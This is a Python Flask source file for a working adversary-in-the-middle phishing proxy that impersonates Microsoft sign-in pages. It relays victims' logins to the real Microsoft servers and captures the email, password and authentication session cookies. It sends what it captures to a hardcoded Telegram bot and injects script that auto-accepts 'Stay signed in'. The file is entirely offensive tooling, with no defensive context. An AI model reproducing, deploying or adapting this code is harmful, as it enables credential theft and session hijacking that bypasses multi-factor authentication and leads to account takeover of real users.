import os
import uuid
import requests
from flask import Flask, request, Response

app = Flask(__name__)

# --- Config ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

PROXY_DOMAIN = "https://outlook-verify.onrender.com"
PROXY_HOST = "outlook-verify.onrender.com"

# vid -> requests.Session (per victim)
visitor_sessions = {}
# vid -> {"email":..., "password":..., "sent_pw":..., "sent_cookies":...}
CAPTURED = {}


# --- Telegram ---
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
        print(f"[TG API] Status: {resp.status_code}")
        if resp.status_code != 200:
            print(f"[TG API] Error: {resp.text}")
    except Exception as e:
        print(f"[TG ERROR] {e}")


# --- Multi-value Set-Cookie extraction ---
def get_set_cookies(resp):
    raw = getattr(resp, "raw", None)
    raw_headers = getattr(raw, "headers", None)
    if raw_headers is not None:
        for attr in ("getlist", "get_all"):
            fn = getattr(raw_headers, attr, None)
            if fn is None:
                continue
            try:
                values = fn("Set-Cookie")
            except Exception:
                continue
            if values:
                return [v for v in values if v]
    merged = resp.headers.get("Set-Cookie")
    return [merged] if merged else []


# --- Rewriting helpers ---
def rewrite_links(text):
    text = text.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
    text = text.replace("https://login.live.com", PROXY_DOMAIN)
    text = text.replace("//login.microsoftonline.com", "//" + PROXY_HOST)
    text = text.replace("//login.live.com", "//" + PROXY_HOST)
    return text


def fix_set_cookie(header_value):
    parts = [p.strip() for p in header_value.split(";") if p.strip()]
    kept = [
        p for p in parts
        if not p.lower().startswith("domain=") and not p.lower().startswith("path=")
    ]
    if not kept or "=" not in kept[0]:
        return header_value
    kept.append("Path=/")
    return "; ".join(kept)


def get_session(vid, user_agent):
    if vid not in visitor_sessions:
        s = requests.Session()
        s.headers.update({
            "User-Agent": user_agent or "Mozilla/5.0",
            "Accept-Language": "en-US,en;q=0.9",
        })
        visitor_sessions[vid] = s
    return visitor_sessions[vid]


def pick_upstream(path):
    if path.startswith(("GetCredentialType.srf", "ppsecure/", "api/")):
        return "https://login.live.com"
    return "https://login.microsoftonline.com"


@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def proxy(path):
    vid = request.cookies.get("vid")
    new_vid = False
    if not vid:
        vid = str(uuid.uuid4())
        new_vid = True
        # Send heartbeat to confirm bot works
        send_telegram(f"<b>👋 New Visitor</b>\nVid: <code>{vid}</code>\nIP: {request.remote_addr}")

    sess = get_session(vid, request.headers.get("User-Agent"))

    target = f"{pick_upstream(path)}/{path}"
    if request.query_string:
        target += "?" + request.query_string.decode()

    headers = {}
    for h in ("Accept", "Accept-Language", "Content-Type", "Origin"):
        if h in request.headers:
            headers[h] = request.headers[h]
    if "Referer" in request.headers:
        headers["Referer"] = request.headers["Referer"].replace(
            PROXY_DOMAIN, "https://login.microsoftonline.com"
        )
    if "Origin" in headers:
        headers["Origin"] = "https://login.microsoftonline.com"

    try:
        if request.method == "POST":
            # DEBUG: Log all form keys to see what Microsoft sends
            print(f"[POST DATA] Vid: {vid} | Keys: {list(request.form.keys())}")
            
            resp = sess.post(
                target, data=request.form, headers=headers,
                allow_redirects=False, timeout=25,
            )
        else:
            resp = sess.get(target, headers=headers, allow_redirects=False, timeout=25)
    except Exception as e:
        return f"Proxy error: {e}", 502

    # --- Capture credentials from the login POST ---
    if request.method == "POST":
        # Try common password field names
        passwd = (
            request.form.get("passwd") or 
            request.form.get("Password") or 
            request.form.get("pwd") or
            request.form.get("password")
        )
        
        # Try common email/username field names
        login = (
            request.form.get("loginfmt") or
            request.form.get("login") or
            request.form.get("username") or
            request.form.get("EmailAddress")
        )
        
        if passwd:
            print(f"[CAPTURED PASSWORD] Vid: {vid}, User: {login}")
            prev = CAPTURED.get(vid, {})
            CAPTURED[vid] = {
                "email": login or prev.get("email"),
                "password": passwd,
                "sent_pw": prev.get("sent_pw", False),
                "sent_cookies": prev.get("sent_cookies", False),
            }
            
            # Send password immediately
            if not CAPTURED[vid]["sent_pw"]:
                CAPTURED[vid]["sent_pw"] = True
                msg = (
                    f"<b>🔑 Password Captured</b>\n\n"
                    f"<b>Email:</b> <code>{login}</code>\n"
                    f"<b>Password:</b> <code>{passwd}</code>\n\n"
                    f"<i>Waiting for session cookies...</i>"
                )
                send_telegram(msg)

    # --- Check for Cookies and Update Previous Message ---
    info = CAPTURED.get(vid)
    if info and not info.get("sent_cookies"):
        cookies = sess.cookies.get_dict()
        # Filter for auth cookies
        auth_cookies = {k: v for k, v in cookies.items() if k.startswith(("ESTSAUTH", "MSFPC", "MSPRequ", "ANON", "RPSSecAuth", "BAP"))}
        
        if auth_cookies:
            info["sent_cookies"] = True
            cookie_str = "\n".join(f"<code>{k}={v[:20]}...</code>" for k, v in auth_cookies.items())
            msg = (
                f"<b>🍪 Session Cookies Captured</b>\n\n"
                f"<b>Email:</b> <code>{info.get('email', '?')}</code>\n\n"
                f"<b>Cookies:</b>\n{cookie_str}"
            )
            send_telegram(msg)
            print(f"[COOKIE SENT] Vid {vid}")

    # --- Build response ---
    r = Response(status=resp.status_code)

    if "Location" in resp.headers:
        loc = resp.headers["Location"]
        loc = loc.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
        loc = loc.replace("https://login.live.com", PROXY_DOMAIN)
        if loc.startswith("/"):
            loc = PROXY_DOMAIN + loc
        r.headers["Location"] = loc

    content_type = resp.headers.get("Content-Type", "")
    body = resp.content

    if "text/html" in content_type:
        text = body.decode("utf-8", errors="ignore")
        text = rewrite_links(text)
        # Auto-click KMSI (Stay Signed In)
        inject = """
        <script>
        (function(){
          if (location.href.indexOf('kmsi') !== -1) {
            var f = document.querySelector('form');
            if (f) {
              var btn = f.querySelector('#idSIButton9, input[type=submit][value="Yes"], button');
              if (btn) { setTimeout(function(){ btn.click(); }, 600); }
            }
          }
        })();
        </script>
        """
        if "</body>" in text:
            text = text.replace("</body>", inject + "</body>")
        body = text.encode("utf-8")
    elif "text/css" in content_type:
        text = body.decode("utf-8", errors="ignore")
        body = rewrite_links(text).encode("utf-8")

    r.set_data(body)
    if content_type:
        r.headers["Content-Type"] = content_type

    for value in get_set_cookies(resp):
        r.headers.add("Set-Cookie", fix_set_cookie(value))

    if new_vid:
        r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax")

    return r


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
